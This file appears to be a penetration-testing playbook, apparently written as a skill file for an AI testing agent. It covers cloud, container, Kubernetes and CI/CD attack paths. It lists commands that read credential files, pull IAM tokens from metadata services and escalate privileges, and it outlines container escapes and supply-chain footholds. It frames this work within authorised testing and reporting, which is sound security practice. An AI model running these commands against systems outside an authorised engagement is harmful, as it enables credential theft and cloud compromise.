---
description: "Cloud, container, and CI/CD attack paths: credential and metadata abuse, S3/Azure/GCP enumeration, Kubernetes and Docker escapes, and supply-chain footholds in build systems, with the exact CLI commands for each provider."
whenToUse: "The target includes cloud infrastructure, containers, Kubernetes, or CI/CD pipelines, or loot contains cloud credentials."
---

# Cloud, container, and supply-chain playbook

## 1. Credential discovery first

Look where cloud identity leaks:

```bash
env | grep -Ei 'aws|azure|gcp|token|key'
cat ~/.aws/credentials ~/.azure/azureProfile.json ~/.config/gcloud/application_default_credentials.json 2>/dev/null
find / -name '*.pem' -o -name 'credentials' -o -name '*.kubeconfig' 2>/dev/null | head
```

Then verify identity before doing anything else:

```bash
aws sts get-caller-identity
az account show
gcloud auth list
```

## 2. AWS

```bash
aws s3 ls
aws s3 ls s3://BUCKET --no-sign-request          # public bucket check
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,Tags]'
aws iam list-attached-user-policies --user-name USER
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]'
aws secretsmanager list-secrets
aws ssm describe-parameters
```

Escalation: `iam:PassRole` + `ec2:RunInstances`, `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, `lambda:UpdateFunctionCode`, `sts:AssumeRole` chains. Confirm each with a dry run where the API supports it.

Metadata service (SSRF-derived or on-instance):

```bash
curl -s -H 'X-aws-ec2-metadata-token: TOKEN' http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/user-data
```

## 3. Azure

```bash
az account list --output table
az resource list --output table
az keyvault list
az ad user list --query '[].userPrincipalName'
az vm list --show-details --output table
```

Paths: managed identity tokens (`IDENTITY_ENDPOINT` + `IDENTITY_HEADER`), service principal secrets in repos and pipeline variables, Key Vault access policies, storage account keys, runbook and automation account credentials, Entra ID app registrations with client secrets.

## 4. GCP

```bash
gcloud projects list
gcloud storage buckets list
gcloud compute instances list
gcloud iam service-accounts list
gcloud secrets list
```

Metadata:

```bash
curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## 5. Containers

```bash
docker ps; docker inspect CONTAINER
docker exec -it CONTAINER sh
cat /var/run/docker.sock    # socket exposed?
```

- Mounted `docker.sock` → start a privileged container with the host root mounted.
- `--privileged` → device access, `mount` the host filesystem.
- `CAP_SYS_ADMIN` → cgroup `release_agent` or `core_pattern` write.
- Shared host PID namespace → inspect and inject into host processes.

## 6. Kubernetes

```bash
kubectl auth can-i --list
kubectl get pods,svc,secrets,sa -A
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Paths: over-privileged service accounts, `create pods` → mount hostPath or use a privileged pod, `get secrets` → cluster credentials, exposed kubelet `10250` with anonymous auth → exec into pods, etcd `2379` without client certs, admission-webhook misconfiguration, and cloud IAM roles bound to service accounts (IRSA/Workload Identity).

## 7. CI/CD and supply chain

- **GitHub Actions:** pull-request-target workflows that check out and execute attacker code, `GITHUB_TOKEN` with write scope, secrets echoed in logs, self-hosted runners, `workflow_run` privilege escalation.
- **Jenkins:** script console, credentials binding, agent-to-controller trust, unauthenticated `/script`.
- **Artifacts:** dependency confusion against internal package names, typosquats, compromised install scripts, cache poisoning.
- **Secrets in history:** `git log -p`, `gitleaks detect`, build logs, artifact metadata.

Prove a supply-chain finding with a non-destructive marker: a file or log line only your injected step could produce.

## 8. Reporting cloud findings

Cloud findings need: principal, permission or misconfiguration, exact API call, resource ARN/ID, blast radius, and whether the action was read-only. Distinguish "credential valid" from "privilege usable" — list what the identity can actually do.
